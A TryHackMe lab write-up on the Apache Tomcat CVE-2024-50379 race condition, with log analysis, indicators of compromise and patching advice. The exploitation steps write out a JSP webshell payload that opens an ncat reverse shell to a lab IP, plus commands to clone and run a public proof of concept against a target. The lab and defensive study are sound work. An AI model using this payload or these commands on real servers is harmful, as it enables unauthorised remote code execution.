# TryHackMe Lab Writeup: Tomcat CVE-2024-50379

## Identification

**CVE-2024-50379** is a critical vulnerability in Apache Tomcat, stemming from a Time-of-Check Time-of-Use (TOCTOU) race condition. This issue is specifically present during JSP compilation when Tomcat is running on a case-insensitive file system (e.g., Windows), and the default servlet is configured with write access enabled (non-default configuration)[6][7][11]. The vulnerability allows a remote, unauthenticated attacker to exploit the timing gap between file checks and their use, potentially achieving Remote Code Execution (RCE).

- **Affected Versions:**
  - Tomcat 11.0.0-M1 – 11.0.1
  - Tomcat 10.1.0-M1 – 10.1.33
  - Tomcat 9.0.0.M1 – 9.0.97

- **Severity:** CVSS v3.1: 9.8 (Critical)
---
## Exploitation

The exploit targets a race window during JSP file handling:

- The attacker uploads a malicious `.jsp` shell (webshell) via the writable default servlet directory.
- Due to the TOCTOU flaw, it’s possible to provoke Tomcat into recognizing the uploaded file as an executable JSP before integrity checks are completed.
- The exploit requires repeating the upload step multiple times to succeed, as the timing is critical and relies on the underlying file system's case sensitivity[4][5].

On successful exploitation, arbitrary code execution is achieved on the server with Tomcat privileges.

**STEPS:** 
1. OPbserve CVE related to Tomcat vulnerability.
<img width="986" height="810" alt="1" src="https://github.com/user-attachments/assets/c836a191-5c7b-4113-ac68-b6b48d837053" />

2. Observe "readonly" configured to false.
<img width="911" height="396" alt="2" src="https://github.com/user-attachments/assets/8d5ca909-2a92-4f76-adce-958041ff099a" />

3. Create a file with the extension Jsp on TOMCAT server
<img width="1005" height="309" alt="3" src="https://github.com/user-attachments/assets/9bfeb94e-6a72-45b7-a1b1-ad49f6ac4eae" />

4. Clone the exploit python script/payload from using following,  
`git clone https://github.com/iSee857/CVE-2024-50379-PoC`
<img width="1012" height="291" alt="4" src="https://github.com/user-attachments/assets/79223c56-30f5-466d-9f72-af68a05b3140" />

5. Observe payload.
<img width="1147" height="694" alt="5" src="https://github.com/user-attachments/assets/5714fb8d-a8c4-4b86-91ac-ef701d95ca89" />

6. Observe runtime flow of script. He we will update thread to 2000 and will modify script to get reverse shell
<img width="933" height="220" alt="6" src="https://github.com/user-attachments/assets/ba4d27a6-cc15-479b-abd5-4123e4dd5f3e" />

7. Observe updated script,  
   `Payload : <%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e  cmd.exe 10.201.109.196 8888\"); %>`
<img width="1279" height="541" alt="7" src="https://github.com/user-attachments/assets/433d0427-31fc-49e2-8eaf-4f09276b2492" />

8. Start listner on port 8888
<img width="691" height="155" alt="8" src="https://github.com/user-attachments/assets/58444a57-f307-43f4-9e97-36433fb67081" />

9. Execute payload/script with folowing command,  
`python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.201.51.150:8080`
<img width="1244" height="54" alt="9" src="https://github.com/user-attachments/assets/5efa17be-0943-42dd-8a58-7799c6a73c3b" />

10. Observe code executed and we got reverse shell
<img width="880" height="730" alt="10" src="https://github.com/user-attachments/assets/d00a9fb2-e5a5-4651-a6ba-5eb0572a1891" />

---

## Log Analysis

### Where to Look

- **Tomcat Access Logs:** Tracks HTTP(S) requests, including file uploads and suspicious repeated requests.  
                          `C:\Program Files\Apache Software Foundation\Tomcat 10.1\logs\access_log_name.txt`
- **Tomcat System Logs:** May indicate unusual compilation activity or file system errors during JSP handling.
- **Sysmon/EDR Solutions:** Useful for detecting abnormal process launches or file modifications outside expected patterns[4][11].

### Indicators of Compromise

- Multiple rapid POST requests to upload endpoints
- Access to unexpected JSP files in writable directories
- Execution of newly-uploaded JSP scripts
- Unusual compilation errors or warnings in `catalina.out`

---

## Mitigation

1. **Upgrade Tomcat:**  
   - Patch to Tomcat 11.0.2+, 10.1.34+, or 9.0.98+ where this vulnerability is fixed.

2. **Secure Configuration:**
   - Disable write access on the default servlet whenever possible, as this reduces the attack surface.
   - On Java 8 or 11: Set the `sun.io.useCanonCaches` system property to `false` (ensures correct path canonicalization).
   - On Java 17: Verify `sun.io.useCanonCaches` is either unset or set to `false`.
   - On Java 21+: The risk is mitigated by default as the problematic cache has been removed.

3. **File System Hardening:**
   - Where possible, run Tomcat on a case-sensitive file system (e.g., Linux ext4).

4. **Restrict Network & User Access:**
   - Limit servlet write permissions to trusted users only.
   - Use firewalls or reverse proxies to restrict access to management and upload functionalities.

---


